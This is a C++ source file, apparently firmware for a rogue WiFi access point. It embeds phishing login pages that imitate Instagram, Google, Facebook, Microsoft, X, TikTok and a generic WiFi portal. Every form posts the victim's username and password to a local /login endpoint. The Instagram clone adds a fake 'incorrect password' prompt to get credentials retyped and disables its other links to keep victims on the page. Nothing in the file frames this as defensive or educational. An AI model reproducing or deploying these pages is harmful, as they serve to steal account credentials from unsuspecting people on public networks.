#include "phishing_pages.h"
#include "rogue_ap.h"
#include <U8g2lib.h>

String loginPages[7];

void initPhishingPages() {
     // =================================================
    // INSTAGRAM - ULTRA REALISTIC WITH ENHANCED DETAILS
    // =================================================
    loginPages[PHISH_INSTAGRAM] = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        /* ===== RESET & BASE ===== */
        * {
            border: none;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #fafafa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin: 0;
            padding: 20px;
        }
        a { text-decoration: none; color: inherit; }
        
        /* ===== MAIN CONTAINER ===== */
        .wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            gap: 20px;
            flex-wrap: wrap;
        }

        /* ===== PHONE MOCKUP ===== */
        .phone-mockup {
            flex: 0 0 454px;
            max-width: 454px;
            position: relative;
            display: none;
        }
        .phone-mockup img {
            width: 100%;
            height: auto;
            display: block;
        }
        .phone-mockup .screenshots {
            position: absolute;
            top: 27px;
            left: 113px;
            width: 250px;
            height: 540px;
            overflow: hidden;
            border-radius: 4px;
        }
        .phone-mockup .screenshots img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            animation: slideShow 12s infinite;
        }
        @keyframes slideShow {
            0%, 20% { opacity: 1; transform: translateY(0); }
            25%, 45% { opacity: 1; transform: translateY(-25%); }
            50%, 70% { opacity: 1; transform: translateY(-50%); }
            75%, 95% { opacity: 1; transform: translateY(-75%); }
            100% { opacity: 1; transform: translateY(0); }
        }

        /* ===== LOGIN PANEL ===== */
        .login-panel {
            flex: 1;
            max-width: 350px;
            min-width: 280px;
            width: 100%;
        }

        .panel {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 10px 0;
            margin-bottom: 10px;
        }

        /* ===== LOGIN FORM ===== */
        .login-form {
            padding: 30px 40px 10px;
        }

        /* ===== INSTAGRAM LOGO - GRADIENT TEXT ===== */
        .ig-logo {
            text-align: center;
            margin-bottom: 25px;
            font-family: 'Billabong', 'Segoe UI', cursive;
            font-size: 54px;
            font-weight: 400;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -1px;
            cursor: default;
            user-select: none;
            line-height: 1.2;
        }
        .ig-logo-fallback {
            display: none;
            text-align: center;
            font-size: 54px;
            font-weight: 400;
            color: #262626;
            font-family: 'Billabong', cursive;
            margin-bottom: 25px;
        }
        @supports not (background-clip: text) {
            .ig-logo { display: none; }
            .ig-logo-fallback { display: block; }
        }

        /* ===== ERROR MESSAGE ===== */
        .error-msg {
            background: #fef0f0;
            border: 1px solid #ed4956;
            border-radius: 4px;
            color: #ed4956;
            padding: 10px 12px;
            font-size: 13px;
            text-align: center;
            display: none;
            margin-bottom: 12px;
            line-height: 1.4;
        }
        .error-msg.show {
            display: block;
            animation: shake 0.3s ease-in-out;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        /* ===== INPUT FIELDS ===== */
        .input-group {
            margin-bottom: 6px;
            position: relative;
        }
        .input-group input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            color: #262626;
            transition: border-color 0.2s, background 0.2s;
            outline: none;
            height: 38px;
        }
        .input-group input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }
        .input-group input:focus {
            border-color: #a8a8a8;
            background: #ffffff;
        }
        .input-group input.error {
            border-color: #ed4956;
        }
        .input-group .toggle-pw {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            color: #262626;
            font-size: 14px;
            cursor: pointer;
            opacity: 0.7;
            font-weight: 600;
            padding: 4px 6px;
        }
        .input-group .toggle-pw:hover {
            opacity: 1;
        }

        /* ===== LOGIN BUTTON ===== */
        .btn-login {
            width: 100%;
            padding: 7px 0;
            background: #0095f6;
            border-radius: 4px;
            color: #ffffff;
            font-weight: 600;
            font-size: 14px;
            margin-top: 8px;
            cursor: pointer;
            transition: background 0.2s, opacity 0.2s;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        .btn-login:hover:not(:disabled) {
            background: #1877f2;
        }
        .btn-login:active:not(:disabled) {
            background: #005fbf;
        }
        .btn-login:disabled {
            opacity: 0.6;
            cursor: default;
        }
        .btn-login .spinner {
            display: none;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top: 2px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .btn-login.loading .spinner {
            display: inline-block;
        }
        .btn-login.loading .btn-text {
            display: none;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ===== DIVIDER ===== */
        .divider {
            display: flex;
            align-items: center;
            padding: 0 40px;
            margin: 12px 0 8px;
        }
        .divider .line {
            background: #dbdbdb;
            height: 1px;
            flex: 1;
        }
        .divider .or {
            color: #8e8e8e;
            font-weight: 600;
            font-size: 13px;
            padding: 0 18px;
            flex-shrink: 0;
        }

        /* ===== FACEBOOK LOGIN ===== */
        .fb-login {
            text-align: center;
            margin: 6px 0;
        }
        .fb-login a {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: color 0.2s;
        }
        .fb-login a:hover {
            color: #1a2e4f;
            text-decoration: underline;
        }
        .fb-login svg {
            vertical-align: middle;
            flex-shrink: 0;
        }

        /* ===== FORGOT PASSWORD ===== */
        .forgot-pw {
            text-align: center;
            margin-top: 14px;
        }
        .forgot-pw a {
            color: #00376b;
            font-size: 12px;
            transition: color 0.2s;
        }
        .forgot-pw a:hover {
            color: #1a2e4f;
            text-decoration: underline;
        }

        /* ===== REGISTER PANEL ===== */
        .register-panel {
            padding: 20px 0;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
        .register-panel span {
            margin-right: 4px;
        }
        .register-panel a {
            color: #0095f6;
            font-weight: 600;
            transition: color 0.2s;
        }
        .register-panel a:hover {
            color: #1877f2;
            text-decoration: underline;
        }

        /* ===== APP DOWNLOAD ===== */
        .app-download {
            text-align: center;
            padding: 10px 0;
        }
        .app-download p {
            font-size: 14px;
            color: #262626;
            margin-bottom: 12px;
        }
        .app-download .stores {
            display: flex;
            justify-content: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .app-download .stores a {
            display: inline-block;
            transition: transform 0.2s;
        }
        .app-download .stores a:hover {
            transform: scale(1.02);
        }
        .app-download .stores svg {
            height: 40px;
            border-radius: 4px;
            display: block;
        }

        /* ===== FOOTER ===== */
        footer {
            max-width: 935px;
            width: 100%;
            padding: 20px 20px 30px;
            margin: 10px auto 0;
        }
        footer ul {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px 16px;
            margin-bottom: 15px;
            list-style: none;
        }
        footer ul li a {
            color: #8e8e8e;
            font-size: 12px;
            transition: color 0.2s;
        }
        footer ul li a:hover {
            color: #262626;
            text-decoration: underline;
        }
        footer .copyright {
            color: #8e8e8e;
            font-size: 11px;
            text-align: center;
        }

        /* ===== RESPONSIVE ===== */
        @media screen and (max-width: 875px) {
            .phone-mockup { display: none; }
            .wrapper { justify-content: center; }
        }

        @media screen and (max-width: 450px) {
            body {
                background: #ffffff;
                padding: 0;
            }
            .wrapper {
                padding: 0;
                margin: 0;
            }
            .panel {
                border: none;
                background: transparent;
                padding: 0;
            }
            .login-form {
                padding: 20px 20px 10px;
            }
            .divider {
                padding: 0 20px;
            }
            .register-panel {
                background: transparent;
                border: none;
                padding: 15px 0;
            }
            footer ul li a { font-size: 11px; }
            .app-download .stores svg {
                height: 36px;
            }
        }

        /* Font import for Billabong */
        @import url('https://fonts.googleapis.com/css2?family=Billabong&display=swap');
    </style>
</head>
<body>

    <div class="wrapper">
        <!-- Phone Mockup -->
        <div class="phone-mockup" id="phoneMockup">
            <svg width="454" height="618" viewBox="0 0 454 618" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- Phone frame -->
                <rect x="2" y="2" width="450" height="614" rx="40" fill="#fff" stroke="#dbdbdb" stroke-width="2"/>
                <rect x="20" y="18" width="414" height="582" rx="28" fill="#fafafa"/>
                <!-- Notch -->
                <rect x="180" y="8" width="94" height="20" rx="10" fill="#000"/>
                <!-- Status bar -->
                <rect x="35" y="50" width="384" height="44" fill="#fff" rx="4"/>
                <circle cx="55" cy="72" r="16" fill="#c4c4c4"/>
                <rect x="80" y="62" width="120" height="10" fill="#c4c4c4" rx="4"/>
                <rect x="80" y="78" width="80" height="8" fill="#c4c4c4" rx="4"/>
                <!-- Feed content -->
                <rect x="35" y="104" width="384" height="250" fill="#c4c4c4" rx="4"/>
                <!-- Story section -->
                <rect x="35" y="364" width="384" height="44" fill="#fff" rx="4"/>
                <circle cx="55" cy="386" r="16" fill="#c4c4c4"/>
                <rect x="80" y="376" width="120" height="10" fill="#c4c4c4" rx="4"/>
                <rect x="80" y="392" width="80" height="8" fill="#c4c4c4" rx="4"/>
                <!-- More content -->
                <rect x="35" y="418" width="384" height="170" fill="#c4c4c4" rx="4"/>
            </svg>
        </div>

        <!-- Login Panel -->
        <div class="login-panel">

            <!-- Login Panel -->
            <div class="panel">
                <div class="login-form">
                    <!-- Instagram Logo -->
                    <div class="ig-logo">Instagram</div>
                    <div class="ig-logo-fallback">Instagram</div>

                    <!-- Error Message -->
                    <div class="error-msg" id="errorMsg">
                        <span id="errorText">Sorry, your password was incorrect. Please double-check your password.</span>
                    </div>

                    <!-- Login Form -->
                    <form action="/login" method="POST" autocomplete="off" id="loginForm" novalidate>
                        <div class="input-group">
                            <input type="text" name="username" id="username" 
                                   placeholder="Phone number, username, or email" 
                                   autofocus required
                                   autocomplete="username">
                        </div>
                        <div class="input-group">
                            <input type="password" name="password" id="password" 
                                   placeholder="Password" 
                                   required
                                   autocomplete="current-password">
                            <button type="button" class="toggle-pw" id="togglePw" aria-label="Show password">Show</button>
                        </div>
                        <button type="submit" class="btn-login" id="loginBtn">
                            <span class="btn-text">Log In</span>
                            <span class="spinner"></span>
                        </button>
                    </form>

                    <!-- Divider -->
                    <div class="divider">
                        <span class="line"></span>
                        <span class="or">OR</span>
                        <span class="line"></span>
                    </div>

                    <!-- Facebook Login -->
                    <div class="fb-login">
                        <a href="#" id="fbLogin">
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20">
                                <path fill="#385185" d="M20 10.06c0-5.52-4.48-10-10-10S0 4.54 0 10.06c0 4.99 3.66 9.13 8.44 9.88v-6.99H5.9v-2.89h2.54V7.78c0-2.52 1.49-3.91 3.77-3.91 1.09 0 2.23.2 2.23.2v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.87h2.78l-.45 2.89h-2.33v6.99C16.34 19.19 20 15.05 20 10.06z"/>
                            </svg>
                            Log in with Facebook
                        </a>
                    </div>

                    <!-- Forgot Password -->
                    <div class="forgot-pw">
                        <a href="#" id="forgotPw">Forgot password?</a>
                    </div>
                </div>
            </div>

            <!-- Register Panel -->
            <div class="panel register-panel">
                <span>Don't have an account?</span>
                <a href="#" id="signUp">Sign up</a>
            </div>

            <!-- App Download -->
            <div class="app-download">
                <p>Get the app.</p>
                <div class="stores">
                    <a href="#">
                        <svg width="135" height="40" viewBox="0 0 135 40">
                            <rect width="135" height="40" rx="6" fill="#000"/>
                            <text x="18" y="19" fill="#fff" font-family="Arial, sans-serif" font-size="9">Download on the</text>
                            <text x="18" y="33" fill="#fff" font-family="Arial, sans-serif" font-size="14" font-weight="bold">App Store</text>
                        </svg>
                    </a>
                    <a href="#">
                        <svg width="135" height="40" viewBox="0 0 135 40">
                            <rect width="135" height="40" rx="6" fill="#000"/>
                            <text x="18" y="19" fill="#fff" font-family="Arial, sans-serif" font-size="9">GET IT ON</text>
                            <text x="18" y="33" fill="#fff" font-family="Arial, sans-serif" font-size="14" font-weight="bold">Google Play</text>
                        </svg>
                    </a>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <ul>
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Instagram Lite</a></li>
            <li><a href="#">Threads</a></li>
            <li><a href="#">Contact</a></li>
            <li><a href="#">Non-profits</a></li>
        </ul>
        <div class="copyright">&copy; 2024 Instagram from Meta</div>
    </footer>

    <script>
        (function() {
            'use strict';

            const form = document.getElementById('loginForm');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');
            const errorMsg = document.getElementById('errorMsg');
            const errorText = document.getElementById('errorText');
            const togglePw = document.getElementById('togglePw');

            // ===== SHOW/HIDE PASSWORD =====
            let pwVisible = false;
            togglePw.addEventListener('click', function() {
                pwVisible = !pwVisible;
                passwordInput.type = pwVisible ? 'text' : 'password';
                togglePw.textContent = pwVisible ? 'Hide' : 'Show';
            });

            // ===== FORM VALIDATION =====
            function showError(message) {
                errorText.textContent = message;
                errorMsg.classList.add('show');
                // Highlight fields
                usernameInput.classList.add('error');
                passwordInput.classList.add('error');
                setTimeout(function() {
                    errorMsg.classList.remove('show');
                    usernameInput.classList.remove('error');
                    passwordInput.classList.remove('error');
                }, 5000);
            }

            function validateForm() {
                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                // Clear previous errors
                usernameInput.classList.remove('error');
                passwordInput.classList.remove('error');

                if (!username || username.length < 1) {
                    showError('Please enter a valid username or email.');
                    usernameInput.focus();
                    return false;
                }

                if (!password || password.length < 1) {
                    showError('Please enter your password.');
                    passwordInput.focus();
                    return false;
                }

                if (password.length < 4) {
                    showError('Your password must be at least 4 characters.');
                    passwordInput.focus();
                    return false;
                }

                return true;
            }

            // ===== FORM SUBMIT =====
            form.addEventListener('submit', function(e) {
                if (!validateForm()) {
                    e.preventDefault();
                    return false;
                }

                // Show loading state
                loginBtn.disabled = true;
                loginBtn.classList.add('loading');

                // Allow form to submit naturally
                // The loading state will persist until page reloads
            });

            // ===== URL ERROR PARAMETER =====
            window.addEventListener('load', function() {
                const params = new URLSearchParams(window.location.search);
                if (params.get('error') === '1') {
                    showError('Sorry, your password was incorrect. Please double-check your password.');
                }
            });

            // ===== PREVENT EMPTY SUBMIT (browser fallback) =====
            form.addEventListener('invalid', function(e) {
                e.preventDefault();
                const field = e.target;
                if (field === usernameInput) {
                    showError('Please enter a username or email.');
                } else if (field === passwordInput) {
                    showError('Please enter your password.');
                }
            }, true);

            // ===== DEMO: Click events for UI feedback =====
            document.getElementById('fbLogin').addEventListener('click', function(e) {
                e.preventDefault();
                showError('Facebook login is temporarily unavailable. Please use your Instagram login.');
            });

            document.getElementById('forgotPw').addEventListener('click', function(e) {
                e.preventDefault();
                showError('Password reset is temporarily unavailable. Please try again later.');
            });

            document.getElementById('signUp').addEventListener('click', function(e) {
                e.preventDefault();
                showError('Sign up is temporarily unavailable. Please try again later.');
            });

        })();
    </script>

</body>
</html>
)rawliteral";

    // =================================================
    // GOOGLE - REALISTIC VERSION
    // =================================================
    loginPages[PHISH_GOOGLE] = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Google</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Roboto,'Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{width:100%;max-width:450px}
.card{background:#fff;border-radius:8px;padding:48px 40px 36px;box-shadow:0 1px 3px rgba(0,0,0,0.12),0 1px 2px rgba(0,0,0,0.24)}
.logo{text-align:center;margin-bottom:30px}
.logo svg{width:75px;height:75px}
h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:8px}
.subtitle{text-align:center;color:#5f6368;font-size:16px;margin-bottom:30px}
.input-group{margin-bottom:16px}
.input-group input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;transition:border-color .2s,box-shadow .2s;color:#202124}
.input-group input:focus{outline:none;border-color:#1a73e8;box-shadow:0 1px 2px rgba(26,115,232,0.2)}
.btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-weight:500;cursor:pointer;width:100%;transition:background .2s}
.btn:hover{background:#1557b0}
.footer{text-align:center;margin-top:20px;color:#5f6368;font-size:14px}
.footer a{color:#1a73e8;text-decoration:none}
.extra-links{display:flex;justify-content:space-between;margin-top:16px;font-size:13px}
.extra-links a{color:#1a73e8;text-decoration:none}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="logo"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="75" height="75"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg></div>
<h1>Sign in</h1>
<p class="subtitle">to continue to Gmail</p>
<form action="/login" method="POST">
<div class="input-group"><input type="email" name="email" placeholder="Email or phone" autofocus required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="btn">Next</button>
</form>
<div class="extra-links"><a href="#">Forgot password?</a><a href="#">Create account</a></div>
<div class="footer"><a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a></div>
</div>
</div>
</body>
</html>
)rawliteral";

    // =================================================
    // FACEBOOK - REALISTIC VERSION
    // =================================================
    loginPages[PHISH_FACEBOOK] = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{width:100%;max-width:400px}
.login-box{background:#fff;border-radius:8px;padding:40px 30px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1)}
.logo{text-align:center;font-size:45px;color:#1877f2;font-weight:bold;margin-bottom:30px}
.input-group{margin-bottom:12px}
.input-group input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;background:#f5f6f7;color:#1c1e21}
.input-group input:focus{outline:none;border-color:#1877f2;background:#fff}
.btn-login{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
.btn-login:hover{background:#166fe5}
.divider{display:flex;align-items:center;margin:20px 0;color:#969696;font-size:14px}
.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid #dadde1}
.divider-text{padding:0 20px}
.forgot{display:block;text-align:center;color:#1877f2;text-decoration:none;font-size:14px;margin:15px 0}
.btn-create{width:100%;padding:14px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:bold;cursor:pointer}
.btn-create:hover{background:#36a420}
.footer{text-align:center;font-size:12px;color:#8a8d91;margin-top:20px}
</style>
</head>
<body>
<div class="container">
<div class="login-box">
<div class="logo">facebook</div>
<form action="/login" method="POST">
<div class="input-group"><input type="text" name="email" placeholder="Email address or phone number" autofocus required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="btn-login">Log In</button>
</form>
<a href="#" class="forgot">Forgot password?</a>
<div class="divider"><span class="divider-text">or</span></div>
<button class="btn-create">Create New Account</button>
<div class="footer">© 2024 Meta</div>
</div>
</div>
</body>
</html>
)rawliteral";

    // =================================================
    // MICROSOFT - REALISTIC VERSION
    // =================================================
    loginPages[PHISH_MICROSOFT] = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Microsoft</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;background:#f8f8f8;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{width:100%;max-width:440px}
.login-box{background:#fff;border-radius:8px;padding:44px 40px;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
.logo{text-align:center;margin-bottom:30px}
.logo svg{width:108px;height:24px}
h1{font-size:24px;font-weight:400;text-align:center;color:#1b1b1b;margin-bottom:8px}
.subtitle{text-align:center;color:#666;font-size:15px;margin-bottom:30px}
.input-group{margin-bottom:16px}
.input-group label{display:block;font-size:13px;color:#1b1b1b;font-weight:600}
.input-group input{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:2px;font-size:15px;color:#1b1b1b}
.input-group input:focus{outline:none;border-color:#0067b8}
.btn{width:100%;padding:12px;background:#0067b8;color:#fff;border:none;border-radius:2px;font-weight:600;cursor:pointer}
.btn:hover{background:#004d8c}
.links{display:flex;justify-content:space-between;margin-top:20px;font-size:13px}
.links a{color:#0067b8;text-decoration:none}
.footer{text-align:center;margin-top:20px;color:#666;font-size:12px}
</style>
</head>
<body>
<div class="container">
<div class="login-box">
<div class="logo"><svg viewBox="0 0 108 24"><path d="M0 0h108v24H0V0z" fill="#00A4EF"/><path d="M46.5 6.5L44 9L46.5 11.5L44 14L46.5 16.5L44 19L46.5 21.5L49 19L51.5 21.5L54 19L56.5 21.5L59 19L61.5 21.5L64 19L61.5 16.5L64 14L61.5 11.5L64 9L61.5 6.5L59 9L56.5 6.5L54 9L51.5 6.5L49 9L46.5 6.5Z" fill="#FFB900"/></svg></div>
<h1>Sign in</h1>
<p class="subtitle">to continue to Microsoft services</p>
<form action="/login" method="POST">
<div class="input-group"><label>Email or phone</label><input type="text" name="email" placeholder="Enter your email" autofocus required></div>
<div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Enter your password" required></div>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot password?</a><a href="#">Create one!</a></div>
<div class="footer">&copy; 2024 Microsoft</div>
</div>
</div>
</body>
</html>
)rawliteral";

    // =================================================
    // TWITTER/X - REALISTIC VERSION
    // =================================================
    loginPages[PHISH_TWITTER] = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>X</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{width:100%;max-width:380px}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:40px 30px}
.logo{text-align:center;font-size:50px;margin-bottom:30px}
h1{font-size:28px;font-weight:700;margin-bottom:30px;text-align:center}
.input-group{margin-bottom:12px}
.input-group input{width:100%;padding:14px 16px;background:#000;border:1px solid #2f3336;border-radius:4px;color:#fff;font-size:16px}
.input-group input:focus{outline:none;border-color:#1d9bf0}
.input-group input::placeholder{color:#71767b}
.btn{width:100%;padding:12px;background:#1d9bf0;color:#fff;border:none;border-radius:20px;font-size:15px;font-weight:700;cursor:pointer}
.btn:hover{background:#1a8cd8}
.divider{display:flex;align-items:center;margin:20px 0;color:#71767b;font-size:14px}
.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid #2f3336}
.divider-text{padding:0 20px}
.signup{text-align:center;font-size:14px;color:#71767b;margin-top:20px}
.signup a{color:#1d9bf0;text-decoration:none}
.footer{text-align:center;font-size:12px;color:#71767b;margin-top:15px}
</style>
</head>
<body>
<div class="container">
<div class="login-box">
<div class="logo">𝕏</div>
<h1>Sign in to X</h1>
<form action="/login" method="POST">
<div class="input-group"><input type="text" name="username" placeholder="Phone, email, or username" autofocus required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="divider"><span class="divider-text">or</span></div>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
<div class="footer">© 2024 X Corp.</div>
</div>
</div>
</body>
</html>
)rawliteral";

    // =================================================
    // TIKTOK - REALISTIC VERSION
    // =================================================
    loginPages[PHISH_TIKTOK] = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TikTok</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{width:100%;max-width:400px}
.login-box{background:#121212;border-radius:12px;padding:40px 30px;border:1px solid #2a2a2a}
.logo{text-align:center;font-size:32px;font-weight:bold;color:#00f2ea;margin-bottom:25px}
.logo span{color:#ff0050}
h2{color:#fff;font-size:22px;font-weight:600;margin-bottom:8px;text-align:center}
.subtitle{color:#888;font-size:14px;text-align:center;margin-bottom:25px}
.input-group{margin-bottom:14px}
.input-group input{width:100%;padding:14px 16px;background:#1a1a1a;border:1px solid #2a2a2a;border-radius:8px;color:#fff;font-size:15px}
.input-group input:focus{outline:none;border-color:#ff0050}
.input-group input::placeholder{color:#666}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#00f2ea,#ff0050);color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer}
.btn:hover{opacity:0.9}
.divider{display:flex;align-items:center;margin:20px 0;color:#666;font-size:13px}
.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid #2a2a2a}
.divider-text{padding:0 20px}
.signup{text-align:center;font-size:14px;color:#666;margin-top:15px}
.signup a{color:#ff0050;text-decoration:none}
.footer{text-align:center;font-size:11px;color:#444;margin-top:15px}
</style>
</head>
<body>
<div class="container">
<div class="login-box">
<div class="logo">Tik<span>Tok</span></div>
<h2>Log in to TikTok</h2>
<p class="subtitle">Manage your account and create videos</p>
<form action="/login" method="POST">
<div class="input-group"><input type="text" name="username" placeholder="Email, phone, or username" autofocus required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="btn">Log in</button>
</form>
<div class="divider"><span class="divider-text">or</span></div>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
<div class="footer">© 2024 TikTok</div>
</div>
</div>
</body>
</html>
)rawliteral";

    // =================================================
    // CUSTOM - Generic WiFi Login
    // =================================================
    loginPages[PHISH_CUSTOM] = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>WiFi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{width:100%;max-width:400px}
.login-box{background:#fff;border-radius:10px;padding:40px 30px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.logo{text-align:center;margin-bottom:30px}
.logo .icon{font-size:48px;display:block}
.logo .title{font-size:24px;font-weight:bold;color:#333;margin-top:8px}
.logo .sub{font-size:14px;color:#666}
.input-group{margin-bottom:12px}
.input-group input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:15px;color:#333}
.input-group input:focus{outline:none;border-color:#667eea}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer}
.btn:hover{transform:translateY(-2px)}
.footer{text-align:center;margin-top:20px;font-size:12px;color:#999}
</style>
</head>
<body>
<div class="container">
<div class="login-box">
<div class="logo"><span class="icon">📶</span><div class="title">WiFi Login</div><div class="sub">Please authenticate to continue</div></div>
<form action="/login" method="POST">
<div class="input-group"><input type="text" name="username" placeholder="Username or Email" autofocus required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="btn">Connect</button>
</form>
<div class="footer">&copy; 2024 WiFi Network</div>
</div>
</div>
</body>
</html>
